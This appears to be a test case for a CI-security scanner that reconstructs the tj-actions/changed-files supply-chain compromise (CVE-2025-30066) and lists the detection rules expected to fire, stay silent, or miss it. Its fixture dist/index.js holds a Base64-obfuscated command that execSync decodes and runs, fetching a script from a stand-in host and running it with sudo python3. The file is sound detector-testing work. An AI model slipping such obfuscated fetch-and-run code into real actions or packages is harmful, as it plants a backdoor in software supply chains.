@@ -1,0 +1,44 @@
+id: tj-actions-changed-files
+title: tj-actions/changed-files (CVE-2025-30066)
+kind: incident
+year: 2025
+technique: >
+  Attackers repointed version tags of a widely used GitHub Action to a commit whose
+  bundled JavaScript contained a Base64-encoded shell command. It downloaded a Python
+  script that read secrets from the runner's memory and printed them, Base64-encoded
+  twice, into the workflow log.
+sources:
+  - https://github.com/advisories/GHSA-mrrh-fwg8-r2c3
+  - https://nvd.nist.gov/vuln/detail/CVE-2025-30066
+reconstruction: >
+  An action whose dist/index.js decodes a Base64 string and runs it with execSync. The
+  decoded command downloads from example.invalid and pipes into python3 and base64;
+  it does not read memory or search for secrets.
+files:
+  action.yml: |
+    name: changed-files
+    description: List changed files
+    runs:
+      using: node20
+      main: dist/index.js
+  dist/index.js: |
+    "use strict";
+    const child_process = require("child_process");
+    const core = { setOutput: (name, value) => console.log(name, value) };
+    const SHELL_SCRIPT = "Y3VybCAtc1NmIGh0dHBzOi8vZXhhbXBsZS5pbnZhbGlkL2R1bW15LnB5IHwgc3VkbyBweXRob24zIHwgYmFzZTY0IC13IDAgfCBiYXNlNjQgLXcgMA==";
+    async function updateFeatures() {
+      child_process.execSync(Buffer.from(SHELL_SCRIPT, "base64").toString("utf-8"), { stdio: "inherit" });
+    }
+    updateFeatures().then(() => core.setOutput("any_changed", "true"));
+must_fire:
+  - {rule: RC-OBF-002, path: dist/index.js}
+must_not_fire: [RC-AUTO-061, RC-BIN-001]
+known_gaps:
+  - rule: RC-OBF-003
+    path: dist/index.js
+    reason: >
+      execSync(Buffer.from(..., "base64")) decodes and runs a command in one step; the
+      rule matches eval and new Function around Buffer.from, not child_process calls.
+not_covered: >
+  The attack itself was a moved tag: workflows that use an action by a mutable tag
+  instead of a commit id are not reported.
